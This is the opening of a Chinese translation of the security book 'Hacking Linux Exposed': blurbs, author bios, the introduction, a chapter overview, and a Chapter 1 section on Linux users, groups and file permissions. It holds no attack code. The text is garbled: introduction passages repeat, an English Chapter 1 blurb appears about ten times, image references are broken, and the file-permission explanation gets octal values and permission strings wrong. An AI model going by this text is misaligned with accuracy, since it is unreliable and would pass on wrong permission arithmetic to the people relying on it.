
# Linux 破解揭秘：Linux 安全秘密与解决方案

“如果你对 Linux 和安全是认真的，买这本书吧。仅此而已。”

——Simple Nomad，《The Hack FAQ》与《Pandora》的作者

![](img/33829ffb1435b4baef56fcd2c28ec6cd_0_0.png)

> “了解攻击者是如何工作的以及系统是如何被攻破的，防止意外入侵的关键。《破解 Linux 实战》剥离了黑客攻击那层‘黑魔法’的外壳，并阐明了保护 Linux 系统免受攻击者破坏的预防技术。这本安全书籍对于 Linux 管理员来说是一份宝贵的资产。你可能会发现员工经常借阅它，并将其视作供在书架上的圣物。”
>
> ——Christoph Klaus，网络安全系统 (ISS) 创始人兼首席技术官

> “《破解 Linux 实战》涵盖了从久经考验的技术到尖端的黑客手段以及之间的一切内容。如果你对 Linux 和安全是认真的，买这本书吧。”
>
> ——Simple Nomad，《The Hack FAQ》与《Pandora》的作者

> “以流行的‘破解实战’风格对 Linux 安全进行了全面的概述。”
>
> ——Rain Forest Puppy (RFP)，Web 服务器安全权威专家，IIS MSADC 漏洞的发现者

> “《破解 Linux 实战》是一部组织严密且模块化的书籍，它教读者在事件发生之前、期间和之后应该做什么。它将多年的安全管理经验整合成了一本参考指南。它说明了确保新安装系统的安全程序，向读者展示了如何从现有机器的入入中恢复，并提供了一套持续监控的方法论。每一章节都包含了来自真实安装环境的插图精美的案例。《破解 Linux 实战》将一个复杂的主题并拆解为适合一线 Linux 用户以及企业 IT 经理的实用格式。”
>
> ——Allen Leibowitz，Anzen Computing CEO，以及 Anzen Flight Jacket 侵入检测系统的开发者

> “我们校园内 Linux 机器数量的快速增长，加上大学开放的网络，使我们成为黑客的理想目标。《破解 Linux 实战》的完全披露政策允许安全专业人士以及对维护系统安全感兴趣的人观察黑客是如何渗透系统的，，以及如何提高防御门槛来反击攻击。如果我们校园的系统管理员利用这本书，他们将为自己和我们的安全团队节省数小时因入侵事件导致的工作时间。”
>
> ——Bob Bartlett，伊利诺伊州芝加哥大学网络安全与企业网络管理处副主任

> “《破解 Linux 实战》是你不仅能理解如何保护自己，还能理解如何像攻击者那样攻入自己的系统的最佳方法。如果你知道如何像攻击者一样思考，你就能保护好你的网络。”
>
> ——Anne Kasarik，SSH Communications Security, Inc. 首席安全顾问

Karin Arrigoni

计算机设计师

Lauren McCarthy

Roberta Steele

插图师

Robert Hansen, Lyssa Sieben-Wald

Michael Mueller, Beth E. Young

封面设计

Dodie Shoemaker

系列设计

Dick Schwartz

Peter F. Hancik

献我的祖父，一个信任与鼓励的无限源泉。

——Brian Hatch

献给我了不起的妻子 Kelli 以及我们的三个孩子 Ryan、Christian 和 Madeline。

——James Lee

献给我提供不懈动力支持的妻子 Anna。

——George Kurtz

献给所有开源开发者、道德黑客以及支持完全披露的人，没有他们，安全永远无法实现。

——作者们

# 关于作者

![](img/33829ffb1435b4baef56fcd2c28ec6cd_7_0.png)

Brian Hatch（右侧）是 Onsight, Inc. (http://www.onsight.com) 的首席黑客，在在那里担任 Unix/Linux 和网络安全顾问。他的客户涵盖了大型银行、制药公司、教育机构，以及加州主要的网络浏览器开发者和互联网公司。Hatch 曾通过 Onsight 以及作为西北大学的兼职教授教授 Unix 和编程课程。

Hatch 在将 Apple II+ 换成第一个 Unix 系统之前就开始维护和攻破解系统。他还是 Stunnel 的共同维护者，这是一个用于加密明文协议的开源 SSL 包装器。可以通过 breach@hackingexposed.com 联系 Hatch 先生。

James Lee（左侧）是 Onsight, Inc. (http://www.onsight.com) 的 CEO，这是一家专注于开源技术的培训和咨询公司。Lee 先生拥有13 年软件开发、培训、Linux 安全和网络编程经验。作为开源倡导者，他认为 Linux 是稳定、安全且有趣的，因为它是开源免费的。他可以没完地讨论 Linux、Perl、Apache 以及其他开源产品的优点——问问他的学生就知道。他在《Linux Journal》上发表过关于网络编程和 Perl 文章。

可以通过 james@hackingexposed.com 联系 Lee 先生。

George Kurtz 是 Foundstone (http://www.foundstone.com) 的 CEO，这是一家领先的安全咨询和培训机构。Kurtz 先生是一位国际认可的安全专家，在安全咨询职业期间进行过数百次防火墙、网络和电子商务相关的评估。Kurtz 先生在入侵检测和防火墙技术、事件响应程序以及远程访问解决方案方面拥有丰富经验。他是许多安全会议的常驻演讲者，并被《华尔街日报》、《InfoWorld》、《今日美国》和美联社等多种媒体引用。Kurtz 先生经常被邀请对突发安全事件发表评论，并在 CNN、CNBC、NBC 和 ABC 等电视节目中亮相。

可以通过 george@hackingexposed.com 联系 Kurtz 先生。

# 贡献作者简介

Nicholas Esborn 是 Swan Systems 的高级系统管理员。Esborn 先生主要在 Unix 系统领域工作了六年，最初使用 FreeBSD 从零开始建立了一家小型 ISP。在位于亚利桑那州图森市的大型 ISP StarNet 工作期间，他开始更多地关注全球网络的安全问题。如今，Esborn 先生在旧金山实施工业级安全网络构架工作。

Eric Maiwald 拥有 CISSP 认证，是 Fortrex Technologies 的安全服务总监。Maiwald 先生负责 Fortrex 客户的所有安全咨询和产品实施。他曾参与为大型金融机构、服务公司和制造商执行评估、制定策略以及实施安全解决方案。Maiwald 先生还是 Fortrex 安全培训的首席讲师，包括 CIS 认证工程师 (ICE) 课程。Maiwald 先生已获得国际信息系统安全认证协会认证的信息系统安全专业人士。他还为会议论文编写了多篇关于入侵检测的白皮书。

Craig Ozancin 是赛门公司的高级安全分析师。Ozancin 先生拥有 21 年的计算机软件经验，最后六年专注于安全领域。作为 AXENT Technologies, Inc. 信息安全 SWAT 队的创始成员之一，Ozancin 专门研究“黑客/破解者”社区，识别新的趋势和漏洞。Ozancin 先生是常见漏洞与披露 (CVE) 项目的投票委员会成员。他是一位经常发表文章的作者，并在演讲中进行演示，展示攻击者破入计算机系统的方法。Ozancin 精通 Unix 和 Linux 安全。

Mike Warfield 是互联网安全系统 (IIS) X-Force 的高级研究员兼专家。Warfield 先生自 1995 年以来加入 IIS，从事 Unix 研发。他从 20 世纪 70 年代初就开始接触计算机和计算机安全。自 80 年代初以来，Warfield 一直是 Unix 系统工程师、顾问、安全顾问以及互联网网络管理员。Warfield 在 LinuxWorld Expo 教授安全课程，并定期就 Linux 系统安全和密码学演讲。他是亚特兰大用户小组的驻留专家和定期演讲者，也是亚特兰大 Linux 爱好者的创始成员之一。他是互联网上多个开源和加密项目的贡献者，例如 Samba、SSH 以及 fetchmail 的 SSL 加密补丁。

# 技术评审员简介



Philip Cox 是 SystemExperts Corporation 的顾问，这是一家专门从事系统安全和管理的咨询公司。他是系统安全领域的知名权威，特别是 Windows 以及 Windows-Unix 混合环境的安全。Cox 先生的日常职责包括执行全面的安全和架构审查、渗透测试，以及为全球许多最大的电子商务公司设计企业级入侵检测系统。Cox 先生是《Windows 2000 安全手册》的首席作者；他是 USENIX 协会杂志《login》的特约专；他还担任 SANS NT Digest 的编辑委员会成员。他是全球各大会议上处理 Unix 和 Windows 安全问题最受推崇的演讲者之一，例如 USENIX、SANS、NetWorld-Interop 和信息安全大会。Cox 先生拥有计算机科学学士学位，目前是微软认证系统工程师 (MCSE)。可以通过 Phil.Cox@SystemExperts.com 与他联系。

索引 . 543
- 权限提升 . . . . . . . . . . . . . . . . . . . . . . . 47
- 针对 Set 的攻击 . . . . . . . . . . . . . . . . . . . . . . 72
- A 保持程序最新 . . . . . . . . . . . . . . . . . . . . . 491
- B 关闭不需要的服务 . . . . . . . . . . . . . . . . . . . . 501
- `/etc/rc.d` 目录 . . . . . . . . . . . . . . . . . . . 503
- 红帽 (Red Hat) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 504
- 深度解析 Linux 网站 . . . . . . . . . . . . . . . 512

## 致谢

如果没有许多人的资源、投入和工作，这本书是不可能完成的。我们作者很大程度上依赖彼此、编辑以及所有在互联网兴起之前就存在的安全发烧友的支持。

最重要的是，感谢我们所有的家人在看似无止尽的研究和写作期间对我们的支持。

# 引言

已有 200,000 名读者了解

《Hacking Exposed》（入侵防御破解）是由 Stuart McClure、Joel Scambray 和 George Kurtz 编写的备受推崇和广受赞誉的国际畅销书。《Hacking Exposed》以以前所未有的深度列举了多种操作系统和网络设备中存在的漏洞。在有限的空间内涵盖如此多的系统问题在于，你永远无法像你希望的那样进行深入探讨。因此，我们创建了《Hacking Exposed》系列的下一本书：《Hacking Linux Exposed》（Linux 黑客攻击破解）。

在《Hacking Exposed》中，我们能够比以往任何时候都详细地涵盖 Linux 黑客攻击。我们能够向你展示 Linux 与其他 Unix 类系统的不同之处，并为你提供你可以立即实施的 Linux 特定对策措施。遵循《Hacking Exposed》犀利直击的风格，《Hacking Linux Exposed》深入探讨了敌人使用的实际攻击。书中认为，负责任的用户应该共享这些信息，因为坏人已经拥有了，这一观点在本书中依然成立。关于用于秘密获取 Linux 系统访问权的实际利用技术，无需另处他寻。《Hacking Linux Exposed》揭秘了 Linux 黑客攻击的神秘世界，以及攻击者用于“root” 系统的电子欺骗手段。

# 是时候加固 Linux 了

1991 年，Linus Torvalds 是赫尔辛基大学的一名学生，也是某些人所谓的自学黑客。这位年轻的芬兰人热爱推 own计算机系统的边界，但没有哪个系统满足他的需求，因此 Linux 是一个真正的“黑客”，他利用自己的技能创造了一场软件革命的开端，并拥有了粉丝般的追随者。

不幸的是，“黑客”一词从早期开始就被歪曲了，它曾象征着像 Linus 这样世界上顶尖的程序员，现在变成了一个可以下载利用代码并肆无忌惮运行的普通 13 岁少年。自 1991 年以来观察到的安全性下降的讽刺之处在于，这种新型“恶意黑客”攻击的大多数系统专门针对 Linux 系统，这在一定程度上是因为它的无处不在。

自从其内核发布到 USENET 并仅仅作为一个爱好操作系统以来，Linux 已经走了很远的路。它的安装范围遍布全球大学。数百万人每天依赖 Linux 处理数据库、电子商务和关键系统；因此，专门用一本书来保持 Linux 的安全是恰当的。

《Hacking Exposed》涵盖了恶意黑客攻击你 Linux 系统的万种方法，以及此类行为背后的逻辑。虽然坏人对这些技术已经非常熟练，但本书旨在教育家庭用户，以及那些工作过量且没有报酬的系统管理员——他们不负责任务关键 Linux 服务器的运行，但必须每天时刻警觉地确保它们的安全。如果你手里拿着这本书，说明你已经做出了安全至关重要的决定。不要放下这本书。继续通过网络掠夺者用于获取你 Linux 系统访问权限的工具和技术，以及你可以用来保持系统安全的对策措施，来不断教育自己。

当我们自己在 Linux 系统上写这篇引言时，我们想起了 Linux 为用户提供的巨大力量和优雅。Linux 的演进现在不再仅仅是传说是可以理解的。它确实是那个“大成”的小系统。虽然 Linux 已经变成了一个极其健壮的操作系统，但它的复杂性为犯毁灭性的安全错误提供了机会。

# 《Hacking Exposed》的所有优势

我们建立在让《Hacking Exposed》成功的优势基础上。我们将引导你了解黑客攻破你机器的每个阶段：

- 目标获取
- 初始访问
- 权限提升
- 掩盖踪迹

## 简介

我们追求模块化，以便可以分易于阅读的章节来阅读。每种攻击和对策措施都可以独立存在，因此你可以根据自己的安排进行阅读，并在讨论的同时解决问题。

许多攻击可以通过相同的对策措施来阻止。我们没有一遍又一遍地描述它们，也非要让你去查阅之前的描述，而是将许多常用程序分离出来并放在书的开头，这样你就可以尽早学习它们，并在它们出现时识别出它们。我们还把某些主题分成了独立的章节，以给予特殊关注。

每种攻击技术都用页边缘的特殊图标突出显示，如下所示：

![](img/33829ffb1435b4baef56fcd2c28ec6cd_26_0.png)

# 这是一个攻击图标

以便于识别特定的渗透测试工具和方法。每种攻击都通过实用的、相关的、经过实地测试的替代方案来应对，这些方案也有自己的特殊图标：

![](img/33829ffb1435b4baef56fcd2c28ec6cd_26_1.png)

# 这是一个对策图标

如果你想的话，可以直接修复我们揭示的问题！我们大量使用了视觉增强图标，来突出显示那些经常被忽略的烦人小细节。

注意

提示

警告

由于配套网站是书中关键的组成部分，我们还为每个指向 www.hackinglinuxexposed.com 的引用创建了图标。经常访问以获取更新、作者的评论、书中提到的所有工具的链接，以及书中包含的所有源代码的副本，这样你就不需要自己输入了。

我们特别注意提供整洁的代码列表、截图和图表，并特别注意在所示的代码列表中用`粗体文本`突出用户输入：

```
prompt# find /home/[p-z]* * -name \.tgz -print
/home/pictures/calvin.tgz
/home/pictures/lydia.tgz
```

## XXVI Hacking Linux Exposed 技巧与解决方案

恶意黑客攻击你 Linux 系统的万种方法，以及此类行为背后的逻辑。虽然坏人对这些技术已经非常熟练，但本书旨在教育家庭用户，以及那些工作过量且没有报酬的系统管理员——他们不负责任务关键 Linux 服务器的运行，但必须每天时刻警觉地确保它们的安全。如果你手里拿着这本书，说明你已经做出了安全至关重要的决定。不要放下这本书。继续通过网络掠夺者用于获取你 Linux 系统访问权限的工具和技术，以及你可以用来保持系统安全的对策措施，来不断教育自己。

当我们自己在 Linux 系统上写这篇引言时，我们想起了 Linux 为用户提供的巨大力量和优雅。Linux 的演进现在不再仅仅是传说是可以理解的。它确实是那个“大成”的小系统。虽然 Linux 已经变成了一个极其健壮的操作系统，但它的复杂性为犯毁灭性的安全错误提供了机会。

# 《Hacking Exposed》的所有优势

我们建立在让《Hacking Exposed》成功的优势基础上。我们将引导你了解黑客攻破你机器的每个阶段：

- 目标获取
- 初始访问
- 权限提升
- 掩盖踪迹

# 简介

我们追求模块化，以便可以分易于阅读的章节来阅读。每种攻击和对策措施都可以独立存在，因此你可以根据自己的安排进行阅读，并在讨论的同时解决问题。

许多攻击可以通过相同的对策措施来阻止。我们没有一遍又一遍地描述它们，也非要让你去查阅之前的描述，而是将许多常用程序分离出来并放在书的开头，这样你就可以尽早学习它们，并在它们出现时识别出它们。我们还把某些主题分成了独立的章节，以给予特殊关注。



# 易于导航，并配有与《Hacking Exposed》第二版相同的图形

每种攻击技术都用页边缘的特殊图标突出显示，如下所示：

![](img/33829ffb1435b4baef56fcd2c28ec6cd_26_0.png)

## 这是一个攻击图标

以便于识别特定的渗透测试工具和方法。每种攻击都通过实用的、相关的、经过实地测试的替代方案来应对，这些方案也有自己的特殊图标：

![](img/33829ffb1435b4baef56fcd2c28ec6cd_26_1.png)

## 这是一个对策图标

如果你想的话，可以直接修复我们揭示的问题！我们大量使用了视觉增强图标，来突出显示那些经常被忽略的烦人小细节。

注意

提示

警告

由于配套网站是书中关键的组成部分，我们还为每个指向 `www.hackinglinuxexposed.com` 的引用创建了图标。经常访问以获取更新、作者的评论、书中提到的所有工具的链接，以及书中包含的所有源代码的副本，这样你就不需要自己输入了。

我们特别注意提供整洁的代码列表、截图和图表，并特别注意在所示的代码列表中用粗体文本突出用户输入：

```
prompt# find /home/[p-z]* * -name \.tgz -print
/home/pictures/calvin.tgz
/home/pictures/lydia.tgz
```

恶意黑客攻击你 Linux 系统的万种方法，以及此类行为背后的逻辑。虽然坏人对这些技术已经非常熟练，但本书旨在教育家庭用户，以及那些工作过量且没有报酬的系统管理员——他们不负责任务关键 Linux 服务器的运行，但必须每天时刻警觉地确保它们的安全。如果你手里拿着这本书，说明你已经做出了安全至关重要的决定。不要放下这本书。继续通过网络掠夺者用于获取你 Linux 系统访问权限的工具和技术，以及你可以用来保持系统安全的对策措施，来不断教育自己。

- are built into the Linux operating system. The seasoned Linux administrator will find that this is already known; however, we provide this material to welcome new Linux administrators and bring them up speed.

Chapter 1 We begin with a brief overview of Linux and introduce security measures that are built into the Linux operating system. The seasoned Linux administrator will find that this is already known; however, we provide this material to welcome new Linux administrators and bring them up speed.

Chapter 1 We begin with a brief overview of Linux and introduce security measures that are built into the Linux operating system. The seasoned Linux administrator will find that this is already known; however, we provide this material to welcome new Linux administrators and bring them up speed.

Chapter 1 We begin with a brief overview of Linux and introduce security measures that are built into the Linux operating system. The seasoned Linux administrator will find that this is already known; however, we provide this material to welcome new Linux administrators and bring them up speed.

Chapter 1 We begin with a brief overview of Linux and introduce security measures that are built into the Linux operating system. The seasoned Linux administrator will find that this is already known; however, we provide this material to welcome new Linux administrators and bring them up speed.

Chapter 1 We begin with a brief overview of Linux and introduce security measures that are built into the Linux operating system. The seasoned Linux administrator will find that this is already known; however, we provide this material to welcome new Linux administrators and bring them up speed.

Chapter 1 We begin with a brief overview of Linux and introduce security measures that are built into the Linux operating system. The seasoned Linux administrator will find that this is already known; however, we provide this material to welcome new Linux administrators and bring them up speed.

Chapter 1 We begin with a brief overview of Linux and introduce security measures that are built into the Linux operating system. The seasoned Linux administrator will find that this is already known; however, we provide this material to welcome new Linux administrators and bring them up speed.

Chapter 1 We begin with a brief overview of Linux and introduce security measures that are built into the Linux operating system. The seasoned Linux administrator will find that this is already known; however, we provide this material to welcome new Linux administrators and bring them up speed.

Chapter 1 We begin with a brief overview of Linux and introduce security measures that are built into the Linux operating system. The seasoned Linux administrator will find that this is already known; however, we provide this material to welcome new Linux administrators and bring them up speed.



# Chapter 1
We begin with a brief overview of Linux and introduce security measures that are built into the Linux operating system. The seasoned Linux administrator will find that this is already known; however, we provide this material to welcome new Linux administrators and bring them up speed.



# 揭秘破解 Linux：Linux 安全秘密与解决方案

## 第 1 章
我们对 Linux 进行了简要概述，并介绍了内置在 Linux 操作系统中的安全措施。丰富的 Linux 管理员会发现这些内容早已已知；然而，我们提供这些材料是为了欢迎新的 Linux 管理员并让他们进入状态。

## 第 2 章
我们把整个章节都用于详细介绍各种黑客攻击防御措施。这些程序和政策将贯穿本书。我们希望让你尽早熟悉这些内容，以便在讨论攻击时心中心中留有它们。

## 第 3 章
我们现在进入核心部分：攻击者如何发现你并检查你的系统。你将学习攻击者如何在互联网上数百万机器中挑选你的机器，确定你正在运行什么，并在尝试接触你的系统之前进行研究。

在攻击者开始弄乱你的机器之前，他必须从外部获取访问权限。他可以采用许多不同的方法进入你的机器。

## 第 4 章
我们首先涵盖了黑客可以直接或间接采用的一些技巧。我们讨论了社会工程，即黑客说服你放下防备的过程。我们将向你展示黑客如何通过让你运行他提供的利用程序，诱导你为他的利益损害你的机器。

## 第 5 章
黑客可能会选择直接从控制台攻入你的计算机。无论你从网络攻击方面对机器做了多少安全防护，拥有你机器物理访问权限的黑客都有许多其他利用途径，例如从软盘启动他自己的操作系统并加载到你的硬盘。

## 第 6 章
目前大多数攻击来自网络上的黑客。我们涵盖了多种可以直接针对你的机器发起以获取未经授权访问的攻击方法，例如利用网络守护进程中的缓冲区溢出和格式漏洞、对未保护的模式进行拨号查询（wardialing）、在网络上运行密码破解程序，以及嗅探你的网络连接以获取有用数据。

## 第 7 章
我们介绍了一些基于滥用网络和网络协议的攻击手段。这些攻击包括 DNS 缓存投毒、修改你的网络路由、滥用 IP 相关的信任问题、中间人攻击，以及困扰过各种知名网站的拒绝服务攻击。这些攻击的目的并不总是为了获取访问权限而攻击你的系统，但可能会对你服务的安全性、数据和可靠性产生巨大影响。

从外部获得的漏洞远少于拥有机器用户级访问权限的黑客所提供的漏洞。在你的系统中，他将试图巩固他已获得的立足点。

## 第 8 章
仅仅因为黑客找到了进入你机器的方法，并不意味着他立即成功获得了超级用户权限。然而，一旦他拥有了用户级账户，他就能看到系统中存在哪些从网络无法访问的额外漏洞。攻击者希望攻破宝贵的 root 账户，一旦攻破，整个系统将处于他的控制之下。

## 第 9 章
密码是访问计算机的钥匙。通过漏洞，黑客可能会获取机器的加密密码并尝试破解它们。密码可以作为通往新系统的跳板（因为许多人会在多个地方使用同一个密码），而且如果他被发现并踢出系统，密码可以帮助他重新获得你系统的访问权限。它们还可能包括 root 本身的密码。我们深入描述了几种黑客可以用来对你的工具，你也应该主动对你的系统运行这些工具。

## 第 10 章
我们展示了黑客在系统被破解后用于加固（军事意义上的）系统的某些方法。黑客会编辑日志文件以掩盖踪迹，为日后的访问创建后门，植入木马系统程序以隐藏当前活动，甚至修改内核本身以防止自己被发现。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_29_0.png)

Linux 机器深受个人和企业的依赖，程度比以往任何时候都要大。这些服务对于互联网业务至关重要，因此我们认为必要深入介绍一些最常见的服务。

## 第 11 章
我们讨论了邮件服务器 Sendmail、Postfix 和 Qmail 安全历史和常见配置问题。这三个软件包涵盖了互联网上类 Unix 主机上几乎安装的所有邮件服务器。

我们还讨论了 FTP 服务器以及 FTP 协议本身。尽管 HTTP 在文件下载中非常流行，但 FTP 因为支持下载和上传，仍被广泛使用。多年来，大多数 FTP 服务器都存在许多安全问题。我们将讨论更好地保护你的 FTP 服务器的方法，以及可能符合你的需求且风险更低的替代方案。

## 第 12 章
互联网的繁荣很大程度上归于 HTTP 和 Web 服务器的创建。似乎世界上每个人都有自己的网页，如果不是自己的域名。很少有公司没有网页，或者至少没有创建一个网页的计划。大多数网页都希望为用户提供不仅仅是静态页的内容。动态内容正成为 Web 上用户交互的关键。

如今许多常见的安全泄露是由 Web 服务器配置不当，或用于保护交互式用户体验的不安全程序造成的。带有 Bug 的 CGI 程序在互联网上随处可见，事实上还随某些 Web 服务器分发。由于关闭 Web 服务器显然不是办法，我们讨论了在提供页面时你应该注意的各种编程陷阱和配置问题。

## 第 13 章
我们将涵盖你可以采用的几种方法，来决定你希望在互联网上开放哪些内容。我们讨论了通过 TCP wrappers 实现用户级访问，以及通过 ipchains 和 iptables 实现内核级控制。通过限制哪些机器可以连接到你的网络服务，你可以大大降低受到互联网攻击的概率。

在附录中，我们将为你提供简单的分步说明，帮助你保持机器安全。

### 附录 A
在这里，我们详细介绍了升级已安装软件的方法，并提供了针对 Red Hat、Debian 和 Slackware 创建的包管理器特定信息。

### 附录 B
本附录展示了如何关闭你不需要的服务，从而为攻击者减少一种利用途径。我们泛指了 init 启动过程，并针对 Red Hat 和 SuSE 的特定差异提供了具体说明。

### 附录 D
《揭秘破解 Linux》涵盖了许多不同的攻击，可以提供不同层次的攻击。我们认为向你展示这些攻击在现实攻击中是如何协同使用的是非常重要的。

他们想要你的数据

黑客可能想要你公司的商业秘密以供个人使用或出售。或者他们可能想要你的银行记录。或者他们可能想要你的信用卡号。或者，他们可能想在从你的机器发起攻击时，让你看起来像个黑客。

又他们可能只是想给你带来大乱。悲哀的事实是，世界上有些人仅仅因为他们可以这样做，就喜欢破坏他人的计算机系统。他们可能认为这一切都是代码。也许他们具有破坏性的人格。也许这能带给他们一些奇特的快乐。也许他们想给他们的黑客朋友留个印象。也许他们觉得很无聊，生活中没有更有趣的事情可以做。谁知道他们为什么想破解你的机器？我的机器。我们的机器。

因此，我们需要自己学习他们的战术、策略和方法，并保护自己免受他们的侵害。



# Linux 与开源运动

Linux 是现在所谓的开源运动的一部分。Linux 操作系统是免费的，但重要的是，Linux 是开源的。这意味着操作系统的源代码是可用的——任何人都可以查看源代码、检查它、修改它，并建议和进行更改。

许多程序都是开源运动的一部分，其中一些程序是全球最流行的程序：

- `Apache`：一种用于互联网上约二之二网站的 Web 服务器。
- `Perl`：一种流行的编程语言，用于解决各种问题。
- `Sendmail`：最流行的邮件传输程序，用于路由互联网上 80% 的电子邮件。
- `Netscape`：曾经曾是闭源的程序，后来变为开源，是一种流行的网页浏览器。

这些程序在几乎所有的 Linux 发行版中可用。

开源的支持者声称，开源软件的本质使其更加安全。开源的批评者则认为，开源软件不够安全。

开源更安全是因为任何人都可以查看它。任何人都可以改进它。在 Linux 内核和应用程序方面，成万的人正在这样做。

1997 年，Eric Raymond 写了一篇名为《教堂与集市》`http://www.tuxedo.org/-esr/writings/cathedral-bazaar/`的里程碑论文。在文中，Raymond 先生对开源软件的优势提出了许多非常好的观点，但他提出的最重要的观点之一是：如果软件是开源软件，成千上万的程序员就可以查看该软件，并通过查看来发现并修复任何错误。

Raymond 先生提出的另一个优秀观点是开源软件经过了彻底的测试。当 Linux 内核的测试（预发布）版本发布时，成千上万的程序员会下载并开始在真实应用中使用它。成千上万程序员对这种预发布版本的真实世界的使用，提供了一个闭源专有软件几乎无法比的测试场景。在发布新版本的 Linux 内核或 Linux 应用程序之前，它已经由许多多样化的程序员查看、测试和改进，这些程序员除了产生高质量的产品外，没有其他目标。他们不需要为了满足那些“穿西装的人们”而走捷径或忽略问题。他们工作的目标只有一个：为了创建一个可靠且安全的产品，因为那是他们想要使用的产品。如果它不安全，他们就不会使用它，也不会修复它。

正如你所想象的，开源软件存在批评者。令人惊讶的是，他们许多人持有闭源专有软件的观点。开源软件反对者提出的一个观点是，开源模型需要大量善良且有真实愿望创建可靠安全产品的程序员，如果他们不善良，这个模型就失效了。在很大程度上，这是事实。然而，历史证明，致力于开源软件（特别是 Linux）的个人确实是善良的。他们的目标是高质量的软件，以及作为改变世界运动的一员所获得的认可。

在 Linux 世界中可以看到善良程序员的例子，他们由仁慈的领导者 Lin Torvalds 领导着。在 Linux 的指导下，其他相信开源概念的程序员创建了一个世界级的操作系统。另一个例子是 Perl 的“仁慈独裁者”`Larry Wall`，Perl 是一种流行的开源编程语言。在 Larry 的指导下，许多才华横溢的程序员聚集在一起创建了一种可用且健壮的编程语言，没有其他原因，仅仅这样做是正确的事。

开源是真实的——如此真实，以至于一名微软员工写了一份现在被称为《万圣节文档》的文件（因为它在 1998 年万圣节期间泄露并公开发；参见 `http://www.opensource.org/halloween/`）。在正文中，该微软员工承认开源软件是对专有软件的威胁，并列出了微软对抗开源软件兴起的策略。

## 用户与组管理

由于 Linux 是一个多用户操作系统，Linux 机器在任何时候都可以有多个用户登录，而且这些用户中的每一个在同一时间内都可以登录多次。了解用户的类型以及如何管理它们对系统安全至关重要。

Linux 机器上所有用户的信息存储在 `/etc/passwd` 文件中。

这是该文件的一个示例：

```
jdoe@server1$ cat /etc/passwd
root:aEGVpwjvgHGG:0:0:root:root:/bin/bash
bin:*:1:1:/bin
daemon:*:2:2:daemon:/sbin
adm:*:3:4:adm:/var/adm
```

请注意 root 的用户 ID 为 0。任何用户 ID 为 0 的账户都是 root 用户，即使用户名不是 root（常见的 root 等效账户名包括 toad 和 super）。

### 普通用户

`Normal Users` 普通用户是指可以登录的用户。普通用户的一个示例是 `/etc/passwd` 文件中的 `jdoe`。普通用户通常有一个家目录（某些用户拥有家目录但无法登录，例如 shell 设置为 `/bin/ftponly` 的用户），并且可以在其家目录和其他目录中创建和操作文件。这些是用于被用来完成工作的标准用户账户（假设他们正在使用 Linux 完成工作）。普通用户对机器上的文件和目录的访问通常受到限制，因此，他们无法执行许多系统级功能（你将在稍后学习更多关于限制的知识）。

### 系统用户

`System Users` 系统用户不登录。它们是用于系统目的的账户，不属于特定个人。例如用户 `nobody` 和 `lp`。`nobody` 用户是通常处理 HTTP 请求的用户。该用户不登录，也没有家目录（严格来说，`nobody` 可能拥有家目录，但因为 `nobody` 无法登录，所以 `nobody` 通常不执行活动）。`lp` 用户通常处理打印请求（`lp` 代表 line printer）。

组是一个一个或多个用户的集合。将许多用户聚集在一起以定义它们作为一个组的属性通常非常方便，例如对他们可以访问或不能访问的内容进行控制（你将在稍后学习更多关于控制的知识）。Linux 上的组定义在 `/etc/group` 文件。以下是该文件的片段：

```
root:x:0:root
bin:x:1:root,bin,daemon
daemon:x:2:root,bin,daemon
sys:x:3:root,bin,adm
adm:x:4:root,adm,daemon
mail:x:12:mail
ftp:x:50:
nobody:x:99:
users:x:100:jdoe,student
```

`/etc/group` 的每一行都是关于该组的单条信息记录。例如，让我们来看 `users` 的条目：

```
users:x:100:jdoe,student
```

该记录包含多个由冒号分隔的字段。字段如下：

| users | 组的唯一名称 |

| :--- | :--- |

| x | 加密后的组密码；如果此字段为空，则不需要密码；如果它是 x，则使用组影子文件 `/etc/gshadow` |

| 100 | 唯一的组 ID 数字 |

| jdoe, student | 组成员用户名的逗号分隔列表 |

因此，组 `users` 是系统上普通用户的集合，在此例中为 `jdoe` 和 `student`。

Linux 系统安全的一个方面是对用户实施访问控制。可以使用几种类型的控制措施，包括文件权限、文件属性、文件系统配额和系统资源限制。

## 文件权限

### File Permissions

Linux 文件权限是一种允许用户限制对系统上文件或目录访问访问的机制。对于文件，用户可以指定谁可以读取该文件、谁可以写入该文件以及谁可以执行该文件（用于可执行程序）。对于目录，用户可以指定谁可以读取目录（列出其内容）、谁可以写入目录（在目录中添加或删除文件）以及谁可以执行位于目录中的程序。

文件 让我们来看文件权限的一个简单示例：

```
$ jdoe@server1 ls -l a.txt
-rw-rw-r-- 1 jdoe jdoe 24 Nov 07:40 a.txt
```

这里我们使用 `ls -l` 命令列出内容，在此例中仅列出文件。`-l` 选项以模式格式列出文件，这显示了关于文件的很多信息。输出列出了 `img/33829ff1435b4ef56cd28ec6cd_41_0.png`。注意，该文件有一个所有者（jdoe）并属于一个组（users）。当我们讨论文件权限时，所有者和组是非常重要的。文件权限如下：`-rw-rw-r--`。此信息分为四个部分：`img/33829ff1435b4ef56cd28ec6cd_42_0.png` 输出的第一部分是文件类型。常见的文件类型如下：

| | |

| :--- | :--- |

| - | 普通文件 |

| d | 目录 |

| l | 符号链接 |

| s | 套接字 |

紧随文件类型之后的是三组字符，代表代表所有者、组和其他世界的权限。这三个字符表示是否授予了读取文件 `r`、写入文件 `w` 或执行文件 `x` 的权限。如果授予了权限，则字母存在。如果权限被拒绝，字母的位置将由连字符 `-` 占据。这里有一个示例：

```
rwx-xr--
```



前三个字符是所有者的权限。`rwx`权限表示所有者可以读取文件、写入文件并执行文件。接下来的三个字符是与文件相关的组的权限。`r-x`权限表示组成员可以读取文件并执行文件，但不能写入文件。最后三个字符是其他世界的权限。`--x`权限表示其他世界无法读取文件也无法写入文件，但可以执行它。请注意，这三种权限要么授予要么被拒绝，要么开启要么关闭。由于权限可以被视为开启或关闭，因此权限可以被视为0或1的集合。例如，“`rwx`”具有开启的读取权限、开启的写入权限和开启的执行权限。因此，我们可以将这些权限写为“111”，在八进制格式下为7。同样，“`r-w`”具有开启的读取权限、关闭的写入权限和开启的执行权限。因此，我们可以将这些权限写为“101”，在八进制格式下为5。`chmod`命令更改文件。如果我们将此想法应用于所有者/组/世界的权限，那么二进制格式的权限为`rwr-x--x`，如果我们将此视为三组八进制数字，则其值为7。为了查看如何使用`chmod`，让我们看我们系统上的一个文件：

```
jdoe@server1 ls -la a.txt
-rw-rw-r-- 1 jdoe jdoe 24 Nov 07:40 a.txt
```

